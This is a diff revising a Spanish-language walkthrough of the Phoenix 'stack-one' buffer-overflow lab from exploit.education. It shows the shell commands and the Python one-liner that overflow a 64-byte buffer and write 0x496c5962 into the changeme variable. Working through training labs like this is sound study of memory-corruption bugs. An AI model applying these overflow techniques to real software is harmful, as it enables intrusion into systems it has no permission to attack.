@@ -95,7 +95,7 @@ int main(int argc, char **argv) {
 
 **Ejecución inicial**
 
-Si ejecutamos el binario sin argumentos:
+Si ejecutamos el binario sin argumentos vemos que nos da un mensaje que nos dice: Especificar un argumento que se copiará en el «búfer».
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one 
@@ -103,7 +103,7 @@ Welcome to phoenix/stack-one, brought to you by https://exploit.education
 stack-one: specify an argument, to be copied into the "buffer"
 ```
 
-Con un solo carácter (A) vemos que changeme sigue en cero: nos da el valor de 0x00000000
+Con un solo carácter (A) vemos que changeme sigue en cero: nos da el valor de **0x00000000**
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one A
@@ -114,7 +114,7 @@ Getting closer! changeme is currently 0x00000000, we want 0x496c5962
 
 **Desbordamiento del buffer**
 
-Probamos llenando el buffer con 64 caracteres A, y luego añadimos BBBB (hex: 0x42424242). ya con esto logramos sobreescribir la variable changeme
+Probamos llenando el buffer con 64 caracteres A, y luego añadimos BBBB en hexadecimal sería **0x42424242** y ya con esto logramos sobreescribir la variable changeme
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print "A"*64'
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -126,7 +126,7 @@ Getting closer! changeme is currently 0x42424242, we want 0x496c5962
 
 **Escribiendo el valor correcto**
 
-El valor esperado es 0x496c5962. En little endian, debe enviarse como: \x62\x59\x6c\x49 y con esto vemos que superamos el reto.
+El valor esperado es **0x496c5962** En little endian, debe enviarse como: **\x62\x59\x6c\x49** y con esto vemos que superamos el reto.
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one $(python -c 'print "A" * 64 + "\x62\x59\x6c\x49"')
